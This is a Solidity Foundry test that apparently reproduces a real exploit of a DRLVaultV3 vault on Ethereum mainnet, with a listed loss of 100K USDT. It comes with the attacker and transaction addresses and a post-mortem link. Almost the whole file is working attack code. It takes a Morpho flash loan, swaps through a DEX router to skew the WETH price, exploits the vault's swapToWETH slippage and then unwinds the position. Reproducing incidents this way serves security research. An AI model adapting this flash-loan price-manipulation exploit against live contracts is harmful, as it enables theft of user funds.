// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 100K USDT
// Attacker : https://etherscan.io/address/0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671 
// Attack Contract : https://etherscan.io/address/0xe08d97e151473a848c3d9ca3f323cb720472d015
// Vulnerable Contract : https://etherscan.io/address/0x6A06707ab339BEE00C6663db17DdB422301ff5e8 
// Attack Tx : https://etherscan.io/tx/0xe3eab35b288c086afa9b86a97ab93c7bb61d21b1951a156d2a8f6f5d5715c475

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6A06707ab339BEE00C6663db17DdB422301ff5e8#code

// @Analysis
// Post-mortem : https://blog.verichains.io/p/the-drlvaultv3-exploit-a-slippage
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant USDC_ADDR = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant USDC_WETH_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;

address constant MORPHO_ADDR = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant DEXROUTER_ADDR = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
address constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
address constant VAULT_ADDR = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

interface IMorpho {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IMorphoFlashLoanReceiver {
    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IDexRouter {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVault {
    function swapToWETH(
        uint256 _amount
    ) external returns (uint256 _amountOut);
}

contract DRLVaultV3_EXP is BaseTestWithBalanceLog, IMorphoFlashLoanReceiver {
    IMorpho public morpho = IMorpho(MORPHO_ADDR);
    IDexRouter public dexRouter = IDexRouter(DEXROUTER_ADDR);
    IDRLVault public vault = IDRLVault(VAULT_ADDR);
    IPancakeV3Pool public pool = IPancakeV3Pool(USDC_WETH_POOL);
    
    uint256 blocknumToForkFrom = 23769387 - 1;
    uint256 FLASHLOAN_USDC = 13980773000000;
    uint256 VAULT_SWAP_USDC = 100000000000;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public balanceLog {
        bytes memory data = abi.encode(uint8(1));
        morpho.flashLoan(USDC_ADDR, FLASHLOAN_USDC, data);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(morpho), "only Morpho");
        console.log("========= After Flash =========");
        console.log("USDC balance", IERC20(USDC_ADDR).balanceOf(address(this)));
        console.log("WETH balance", IERC20(WETH_ADDR).balanceOf(address(this)));
        console.log("ETH balance", address(this).balance);
        uint256 wethPrice = CalcPrice();
        console.log("WETH Price before swap", wethPrice);

        IERC20(USDC_ADDR).approve(TOKEN_APPROVE, type(uint256).max);
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);
        pools[0] = 14474011154664524427946373127366704448275315930774981940324572871603728323487;
        dexRouter.uniswapV3SwapTo(receiver, FLASHLOAN_USDC, 96069676420420156, pools);

        console.log("========= After Swap on DexRouter =========");
        console.log("USDC balance", IERC20(USDC_ADDR).balanceOf(address(this)));
        console.log("WETH balance", IERC20(WETH_ADDR).balanceOf(address(this)));
        console.log("ETH balance", address(this).balance);
        wethPrice = CalcPrice();
        console.log("WETH Price after swap", wethPrice);
        
        console.log("========= Before Swap on Vault =========");
        console.log("Vault weth balane", IERC20(WETH_ADDR).balanceOf(VAULT_ADDR));
        console.log("Vault eth balane", VAULT_ADDR.balance);
        console.log("Vault usdc balane", IERC20(USDC_ADDR).balanceOf(VAULT_ADDR));

        vault.swapToWETH(VAULT_SWAP_USDC);

        console.log("========= After Swap on Vault =========");
        console.log("USDC balance", IERC20(USDC_ADDR).balanceOf(address(this)));
        console.log("WETH balance", IERC20(WETH_ADDR).balanceOf(address(this)));
        console.log("ETH balance", address(this).balance);
        wethPrice = CalcPrice();
        console.log("WETH Price after swap", wethPrice);

        pools[0] = 57896044618658097711785492505624669893251560180390193455121166874571151938463;
        uint256 amountIn = 779999999999792152553;
        dexRouter.uniswapV3SwapTo{value: amountIn}(receiver, amountIn, 0, pools);

        console.log("========= After Swap on DexRouter =========");
        console.log("USDC balance", IERC20(USDC_ADDR).balanceOf(address(this)));
        console.log("WETH balance", IERC20(WETH_ADDR).balanceOf(address(this)));
        console.log("ETH balance", address(this).balance);
        wethPrice = CalcPrice();
        console.log("WETH Price after swap", wethPrice);

        IERC20(USDC_ADDR).approve(USDC_WETH_POOL, type(uint256).max);
        IERC20(WETH_ADDR).approve(USDC_WETH_POOL, type(uint256).max);

        (bool success, ) = payable(WETH_ADDR).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
        
        bytes memory data = "0x0500c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000044a9059cbb000000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f00000000000000000000000000000000000000000000000050e0230d060eba7205";
        pool.swap(address(this), false, int256(-21291294107), 1461446703485210103287273052203988822378723970341, data);

        console.log("========= After Swap on DexRouter =========");
        console.log("USDC balance", IERC20(USDC_ADDR).balanceOf(address(this)));
        console.log("WETH balance", IERC20(WETH_ADDR).balanceOf(address(this)) / 1e18 );
        console.log("ETH balance", address(this).balance);
        wethPrice = CalcPrice();
        console.log("WETH Price after swap", wethPrice);

        IERC20(USDC_ADDR).approve(MORPHO_ADDR, type(uint256).max);

    }

    function CalcPrice() internal returns(uint256 finalPrice) {
        IPancakeV3PoolState pool = IPancakeV3PoolState(USDC_WETH_POOL);
    
        (uint256 sqrtPriceX96, int24 tick,,,,,) = pool.slot0();
        finalPrice = 1e12/(sqrtPriceX96/2**96)**2;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        IERC20(WETH_ADDR).transfer(USDC_WETH_POOL, uint256(amount1Delta));
    }

    receive() external payable {}

}